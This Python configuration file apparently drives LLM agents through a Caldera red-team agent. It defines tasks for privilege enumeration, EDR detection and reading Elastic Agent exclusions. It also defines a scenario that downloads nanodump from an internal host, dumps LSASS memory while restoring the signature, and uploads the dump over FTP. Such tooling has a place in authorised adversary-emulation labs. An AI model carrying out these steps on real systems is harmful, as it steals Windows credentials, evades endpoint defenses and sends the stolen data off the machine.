actions = {
    "DETECT_AGENT_PRIVILEGES": [
        {
            "message": "Get the current user's privileges on the active Caldera agent using a Powershell command.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL privileges.",
            "agent": "caldera_agent",
        },
        {
            "message": "List all the users privileges in a structured table and add a conclusion on if the agent is running with standard user, administrator or system privileges.",
            "summary_method": "last_msg",
            "agent": "text_analyst_agent",
        },
    ],
    "COLLECT_CALDERA_INFO": [
        {
            "message": "Get the ID of the active Caldera operation.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the ID of the active Caldera operation.",
            "agent": "caldera_agent",
        },
        {
            "message": "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the PAW of the active Caldera agent.",
            "agent": "caldera_agent",
        },
    ],
    "TEST": [
        {
            "message": "use Powershell to fetch the list of Exclusions for Elastic Agent on the active Caldera agent.",
            "summary_method": "last_msg",
            "summary_method": "reflection_with_llm",
            "agent": "caldera_agent",
        },
    ],
    "DETECT_EDR": [
        {
            "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README.",
            "agent": "internet_agent",
        },
        {
            "message": "List all Windows services on the active Caldera agent",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL Windows service names WITHOUT WINDOWS in their path name.",
            "agent": "caldera_agent",
        },
        {
            "message": """Identify which security services are likely running on the active Caldera agent based on the provided context.
            Do a fuzzy match comparing the list of running services with the list of security products. Partial matches are OK.
            It's possible that multiple security agents are running.""",
            "summary_method": "reflection_with_llm",
            "agent": "text_analyst_agent",
        },
    ],
    "HELLO_CALDERA": [
        {
            "message": "Use powershell to display a message box on the desktop of the active Caldera agent containing a cyber security joke.",
            "summary_method": "last_msg",
            "agent": "caldera_agent",
        }
    ],
    "DOWNLOAD_AND_RUN_NANODUMP": [
        {
            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
            "agent": "caldera_agent",
        },
        {
            "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with an exhaustive list of all available nanodump flags and their description.",
            "agent": "internet_agent",
        },
        {
            "message": "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
            "agent": "caldera_agent",
        },
        {
            "message": "Upload the dumped LSASS file using FTP.",
            "summary_method": "reflection_with_llm",
            "agent": "caldera_agent",
        },
    ],
}

scenarios = {
    "TEST": ["COLLECT_CALDERA_INFO", "TEST"],
    "COLLECT_CALDERA_INFO": ["COLLECT_CALDERA_INFO"],
    "DUMP_LSASS": [
        "COLLECT_CALDERA_INFO",
        "DOWNLOAD_AND_RUN_NANODUMP",
    ],
    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
    "HELLO_CALDERA": ["COLLECT_CALDERA_INFO", "HELLO_CALDERA"],
    "DETECT_AGENT_PRIVILEGES": ["COLLECT_CALDERA_INFO", "DETECT_AGENT_PRIVILEGES"],
}
